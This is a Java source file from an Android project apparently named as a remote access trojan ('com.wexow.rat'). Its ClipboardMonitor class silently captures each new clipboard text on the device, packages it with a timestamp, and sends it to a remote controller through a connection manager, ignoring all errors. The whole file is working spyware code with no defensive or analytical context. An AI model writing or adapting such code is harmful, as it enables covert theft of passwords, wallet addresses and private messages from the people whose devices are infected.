package com.wexow.rat.managers;

import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;

import com.wexow.rat.core.ConnectionManager;

import org.json.JSONObject;

public class ClipboardMonitor {
    private static ClipboardManager cm;
    private static ClipboardManager.OnPrimaryClipChangedListener listener;
    private static String lastContent = "";

    public static void start(Context ctx) {
        if (listener != null) return;

        cm = (ClipboardManager) ctx.getSystemService(Context.CLIPBOARD_SERVICE);
        if (cm == null) return;

        listener = () -> {
            try {
                if (!cm.hasPrimaryClip()) return;
                ClipData clip = cm.getPrimaryClip();
                if (clip == null || clip.getItemCount() == 0) return;

                CharSequence text = clip.getItemAt(0).getText();
                if (text == null) return;

                String content = text.toString();
                if (content.equals(lastContent)) return;
                lastContent = content;

                JSONObject jo = new JSONObject();
                jo.put("type", "clipboard");
                jo.put("content", content);
                jo.put("time", System.currentTimeMillis());
                ConnectionManager.send(jo.toString());
            } catch (Exception ignored) {}
        };
        cm.addPrimaryClipChangedListener(listener);
    }

    public static void stop() {
        if (cm != null && listener != null) {
            cm.removePrimaryClipChangedListener(listener);
            listener = null;
        }
    }
}